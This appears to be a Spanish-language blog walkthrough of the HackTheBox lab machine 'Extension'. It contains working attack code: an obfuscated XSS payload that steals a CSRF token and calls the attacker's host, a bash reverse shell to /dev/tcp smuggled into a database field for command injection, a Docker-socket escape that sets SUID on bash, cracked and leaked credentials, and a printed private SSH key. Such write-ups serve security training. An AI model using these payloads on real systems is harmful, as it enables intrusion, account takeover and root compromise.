---
title: Extension - HackTheBox
categories: [ Linux ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Extension/Extension.jpg">

Hola a todos! Hoy vamos a completar la máquina [Extension](https://app.hackthebox.com/machines/Extension) de la plataforma [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- **Hash Cracking**
- **Credentials Leakage in Authorization Header**
- **Cross Site Scripting (XSS) to get Private Gitea Repositories**
- **Abusing MySQL to change web's parameter to reach Command Injection into a Docker Container** 
- **Docker Breakout - Command Injection in the Host Machine [Privilege Escalation]**

# Reconocimiento

* * * 

Antes que todo, y como con cualquier otra máquina, comenzaremos por el escaneo de puertos con la herramienta `nmap`, escanearemos todo el rango de puertos (1-65535) por el protocolo TCP

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.171 -oG allPorts
Nmap scan report for 10.10.11.171
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora profundizaremos el escaneo con `nmap`, únicamente osbre estos puertos

```shell
❯ nmap -p22,80 -sCV 10.10.11.171 -oN targeted
Nmap scan report for 10.10.11.171
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA)
|   256 913ab2922b637d91f1582b1b54f9703c (ECDSA)
|_  256 6520392ba73b33e5ed49a9acea01bd37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: snippet.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

Si nos fijamso en el nombre de la página web, nos damos cuenta del dominio `snippet.htb`, así que lo añadiremos al `/etc/hosts`

```shell
❯ echo "10.10.11.171 snippet.htb" | tee -a /etc/hosts
10.10.11.171 snippet.htb
```


Ahora que tenemos un dominio, podemos fuzzear por subdominio, voy a utilizar la herramienta `wfuzz`, aunque podáis usar otras como `gobuster, ffuf`...

```bash
❯ wfuzz -c --hc=404 --hl=29 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.snippet.htb" http://snippet.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000019:   200        249 L    1197 W     12729 Ch    "dev"                                                                                                                  
000000002:   200        96 L     331 W      5311 Ch     "mail"                                                                                                                 
```

Añadiremos los subdominios al `/etc/hosts`, y aplicaremos expresiones regulares para encontrar algunos directorios en el código fuente de la página principal

```bash
❯ curl -s 10.10.11.171 | grep Ziggy | sed 's/    const Ziggy = //' | jq | grep uri | awk '{print $2}' | tr -d '"",'
_ignition/health-check
_ignition/execute-solution
_ignition/share-report
_ignition/scripts/{script}
_ignition/styles/{style}
dashboard
users
snippets
snippets/{id}
snippets/update/{id}
snippets/update/{id}
snippets/delete/{id}
new
management/validate
management/dump
register
login
forgot-password
forgot-password
reset-password/{token}
reset-password
verify-email
verify-email/{id}/{hash}
email/verification-notification
confirm-password
logout
```

# Explotación

Podemos ver el directorio `management/dump` el cual al cambiar la data por `POST` espera una estructura en `JSON`

Así que capturaremos la petición con la herramienta proxy `BurpSuite`, después de fuzzear por parámetros encontramos una combinación válida

![](/assets/img/HTB/Extension/burp.png)

Al mirar la respuesta tenemos cientos de datos de usuarios 

![](/assets/img/HTB/Extension/burp1.png)

Entre otros encontramos al usuario `gia` con una contraseña

```json
"name": "Gia Stehr",
"email": "gia@snippet.htb",
"password": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
```

La contraseña es fácil de crackear con john

```bash
❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 XOP 4x2])
password123      (gia)
Session completed
```

Ahora nos loguaremos en el login con las credenciales obtenidas

![](/assets/img/HTB/Extension/login.png)

Al iniciar sesión podemos ver dos snippets, uno de ellos está escrito en bash

![](/assets/img/HTB/Extension/snippets.png)

Si nos fijamos es un comando `curl`, pero con un header

![](/assets/img/HTB/Extension/bash.png)

La cabecera está encodeada en Base64, así que vamos a decodearla

```sh
❯ echo "amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB" | base64 -d; echo
jean:EHmfar1Y7ppA9O5TAIXnYnJpA
```

Con estas credenciales nos podremos loguear en el login del subdominio `dev`

![](/assets/img/HTB/Extension/gitea_login.png)

Encontramos un repositorio llamado `Extension` que está en privado, vamos a echarle un vistazo

![](/assets/img/HTB/Extension/gitea_repos.png)

Si nos fijamos en los commits simplemente ha cambiado la operación `return`

![](/assets/img/HTB/Extension/fail.png)

Ahora la idea es crear un payload XSS sin los simbolos, que se puede ver que los borra

Definiremos la variable `u` que ha de valer la url de destino donde enviaremos la petición

```js
var u = 'http://dev.snippet.htb/charlie/backups/settings/collaboration';
```

Después haremos una petición que nos agregue como colaboradores el repo de Charlie

```js
fetch(u).then(r => document.querySelector('meta[name=_csrf]').content).then(t => fetch(u,{method:'POST',headers: {'Content-Type':'application/x-www-form-urlencoded;'}, body:'collaborator=jean&_csrf='+t}))
```

Cuando nos haya agregado enviaremos una petición a nuestro host para saberlo

```js
then(d => fetch('http://10.10.14.48/ok
```

Finalmente quedaría algo así

```js
var u='http://dev.snippet.htb/charlie/backups/settings/collaboration';fetch(u).then(r => document.querySelector('meta[name=_csrf]').content).then(t => fetch(u,{method:'POST',headers: {'Content-Type':'application/x-www-form-urlencoded;'}, body:'collaborator=jean&_csrf='+t}).then(d => fetch('http://10.10.14.48/ok')))
```

Encodearemos toda la linea a base64 y agregaremos la parte del XSS, el payload nos quedaría algo así

```html
xss<xss><img SRC="x" onerror=eval.call`${"eval\x28atob`dmFyIHU9J2h0dHA6Ly9kZXYuc25pcHBldC5odGIvY2hhcmxpZS9iYWNrdXBzL3NldHRpbmdzL2NvbGxhYm9yYXRpb24nO2ZldGNoKHUpLnRoZW4ociA9PiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdtZXRhW25hbWU9X2NzcmZdJykuY29udGVudCkudGhlbih0ID0+IGZldGNoKHUse21ldGhvZDonUE9TVCcsaGVhZGVyczogeydDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7J30sIGJvZHk6J2NvbGxhYm9yYXRvcj1qZWFuJl9jc3JmPScrdH0pLnRoZW4oZCA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjQ4L29rJykpKQo=`\x29"}`>
```

Podemos ir al apartado `issues`, pegar nuestro payload, crear un servidor http con python en el puerto 80 y esperar a que el usuario `Charlie` lo vea

![](/assets/img/HTB/Extension/XSS.png)

Si esperamos unos segundos, nos llegará una petición al servidor python que nos confirma que se ha completado el script

```sh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.171 - - code 404, message File not found
10.10.11.171 - - "GET /ok HTTP/1.1" 404 -
```

Si ahora miramos los repositorios disponibles podemos ver un repositorio llamado `backup` del usuario `Charlie`

![](/assets/img/HTB/Extension/backup.png)

Dentro del repositorio encontramos un comprimido, así que lo descargaremos y descomprimiremos

![](/assets/img/HTB/Extension/comprimido.png)

Al descomprimirlo encontramos en el directorio `ssh` una clave `id_rsa` privada, nos conectaremos por ssh

```sh
home/charlie/.ssh ❯ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAx3BQ74w6hDrMrj5bxneqSvicR8WjTBF/BEIWdzJpvWi+9onO
ufOUl0P+DE9YEv51HpOLqZ/ZuSUxzMV/Wf2Po4+aglepfGBx6GfuEm2mVH9x3T8p
OZGWvs7qMMsh86ViyLwivMm0s/NdW8I0NnKVmN9DVksJL5VO++Pc4GCkBHqQEU1p
V5FeCUX/ah8cllmGC/W4op0aVM9MTlzD5YB1IOTpZgo8dG1yvVpySHWqBuG/Hg4L
A2/lLn0OBU1nj52v4dpwuJ+7RgicgGgrJfj6roHEDsdQFs5uv0v7roYboKnknLo6
Fiz2/eQtTVb176+AhSdgs3UPqj9A7QgxV0GY6wIDAQABAoIBAQCh1N6n8rbM81WB
EjKwUgvJ+AAAMTw3jn7tup62LB8nReam8N3hf+iT8eUkogGKsBXjMMCEbKRkGu1V
BvE22YyDoRQ0LePme/ASMLs7EuSD7kI70HOoNh4HSKk53Kr5JLuKvTbG0DmkR5b6
zRRHFiWTvZ7LV+nlRZeox5ZEL8cHpejKB5wBdVJ/UvHRs/XvvZv86JFagbbfzrH6
DJz4isE9SEFxcnWtKAnCz03CoP8mI0+5klIP359hkOKx1dYfSlc4zccZqU5y1Uiv
tEtcEnvaPoARSuxA3hoN6wchnOvLbzFO2RN5vtxZ9YmztcelMOHLUrliun96sUgV
33XkTjPpAoGBAPIo0UfIT4XXscKNkSp1VXai9E3noH1E2q6fIccAvmpOA3I2AW7R
eEe1OD3beuArgL+RVF8oJOAD+UkWn8CP2bXnnT11a753WGUnPIr5Q9Mm1rZcrCD2
EF5689eKSq49ecu2ISt3lyb4VMku1GXzQ3zaFELI8eSvTNXQjpLeAWBFAoGBANLW
bQjQz81+dwud4grHGUCe2L9g0k/KmnJ//Q0+6iI9EGNmJLf5yHnYnqvIWWXSpOss
Q3ZTJGWUHJ/vDlrSpauZ6FJM9X4YLJ2DsSPFcxfcps+Y1oGE8o9Q7XHqyE4UrDiM
H36CsRGPNwmwNMNHUb/lkjELYKzSF58cTdA7Rp9vAoGBAOJL+qcWLhppoxioqwv+
cktXpO5YksX93k5pL2uE6mz1UoscpOImpjx8wX4s6PssLDjZWvtBzJP7oq4Gkmul
AlLXiz2vyWxIozaEIDPPFO7x0JzCpah3ynxAcjbuaTPDB1qzbPPt4jbswm7vcFWF
q3+1XFG87zBCEY+OQm5FQQvxAoGAfJZ3Mflqgm0T3cp7U5EZjAUR4e1N+haoM7cM
CvK9mmPpNkOauRiibdYi1TH8Gd5i1BGA///bhycBz0SNf//wJDo7fb66ZrvUSXQT
jibUfypFbHFNeJXeW/Afj+yEVxeCOZwb1D9YcR7nEBOO6kJPvYzkWZT2mMlBaiVo
mf8dGYMCgYEA2Bqocj0mcncnt2m1F6Obp3ptv7zwF/upk70lC6z3uo1xTSfnGPP/
MaX9vAmUF9XNwolFVzU6STMreBPRshW9RK+3tcx8Elxj4y+tMQCLHLvgyyYaGbp8
iPU8FQCtjFpHKqxW0xdDDvfHUeUmiQRTZ1o3kJK6mr3QM89LJC/l7gA=
-----END RSA PRIVATE KEY-----
```

```bash
❯ ssh -i id_rsa charlie@10.10.11.171
The authenticity of host '10.10.11.171 (10.10.11.171)' can't be established.
ED25519 key fingerprint is SHA256:f9e/N03fZyqc98TRtAnDizBbOVZt7TDlhcR/wXgJz3U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.171' (ED25519) to the list of known hosts.
charlie@extension:~$ id
uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)
charlie@extension:~$ 
```

Podemos reutilizar las credenciales de gitea y migrar al usuario `Jean`, obteniendo el user.txt

```sh
charlie@extension:~$ su jean
Password: 
jean@extension:/home/charlie$ cd
jean@extension:~$ cat user.txt 
8371a246e34d9441cdd683aaad5ddabd
jean@extension:~$ 
```

# Escalada de Privilegios

Jean en su directorio personal de usuario tiene unos archivos interesantes, y un archivo PHP parece tener una vulnerabilidad

```sh
jean@extension:~/projects/laravel-app/app/Http/Controllers$ cat AdminController.php | tail -n 11 | head -n 8
        if ($given !== $actual) {
            throw ValidationException::withMessages([
                'email' => "Invalid signature!",
            ]);
        } else {
            $res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
            return Redirect::back()->with('message', trim($res));
        }
jean@extension:~/projects/laravel-app/app/Http/Controllers$ 
```

La vulnerabilidad reside en que está metiendo una variable que podemos controlar en un comando

Mirando tareas con pspy encontramos credenciales válidas para MySQL

```shell
CMD: UID=0    PID=28723 | sh -c mysql -u root -ptoor --database webapp ....
```

Ya que la máquina no tiene ´MySQL´, haremos un Port Forwarding para que el puerto 3306 de la máquina víctima sea el puerto 3306 de nuestro localhost

```shell
ssh charlie@10.10.11.171 -i id_rsa -L 3306:127.0.0.1:3306
charlie@extension: ~$
```

Ahora nos conectaremos a la base de datos en local y cambiaremos el tipo de usuario de `Gia` a `Manager`

```sh
❯ mysql -h 127.0.0.1 -Dwebapp -uroot -ptoor
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 710
Server version: 5.6.51 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [webapp]> update users set user_type='Manager' where email='gia@snippet.htb';
Query OK, 1 row affected (0,059 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [webapp]> 
```

Al conectarnos de nuevo a snippet.htb como antes ahora tenemos acceso privilegiado

![](/assets/img/HTB/Extension/login.png)

Hay un apartado `members` donde podemos ver la función de validar de usuarios vulnerable

![](/assets/img/HTB/Extension/vuln.png)

```shell
MySQL [webapp]> insert into users(name,email) values('shell','shell@shell|| bash -c "bash -i >& /dev/tcp/10.10.14.48/443 0>&1" &');
Query OK, 1 row affected, 2 warnings (0,242 sec)

MySQL [webapp]> 
```

Una vez lo agregamos podemos verlo en la última parte del apartado members en la web

![](/assets/img/HTB/Extension/shell.png)

Basta con darle a `VALIDATE` para invocarlo y recibir la shell en un contenedor

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
application@4dae106254bf:/var/www/html/public$ id
id
uid=1000(application) gid=1000(application) groups=1000(application),999(app)
application@4dae106254bf:/var/www/html/public$ hostname -I
hostname -I
172.21.0.3 172.18.0.4 
application@4dae106254bf:/var/www/html/public$ 
```

Podemos ver un archivo `socket` en /app el cual tiene permisos de escritura por nuestro grupo

```shell
application@4dae106254bf:/app$ ls -l 
total 0
srw-rw---- 1 root app 0 Mar 11 03:42 docker.sock
application@4dae106254bf:/app$ 
```

Para escalar privilegios podemos guiarnos del siguiente [Articulo](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25) simplemente haciendo algunos cambios

```sh
application@4dae106254bf:/app$ cmd="[\"/bin/sh\",\"-c\",\"chroot /mnt && sh -c \\\"chmod u+s /mnt/bin/bash\\\"\"]"
application@4dae106254bf:/app$ curl --unix-socket /app/docker.sock -d "{\"Image\":\"laravel-app_main\",\"cmd\":$cmd, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=privesc
{"Id":"07fb47112a55d812fd5bdec7d1b656fe05218efc3e11e8ec176119217a2735d9","Warnings":[]}
application@4dae106254bf:/app$ curl -X POST --unix-socket /app/docker.sock http://localhost/containers/privesc/start
application@4dae106254bf:/app$ 
```

Ahora desde la shell de la máquina host como el usuario `Charlie`, podemos ver los permisos de la `bash`, y nos fijamos que es `SUID`, usaremos el parámetro `-p`, y somos root!

```shell
charlie@extension:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
charlie@extension:~$ bash -p
bash-4.4# id
uid=1001(charlie) gid=1001(charlie) euid=0(root) groups=1001(charlie)
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# cat root.txt 
c0354241ed568beb14115bd049ad3a58
bash-4.4# 
```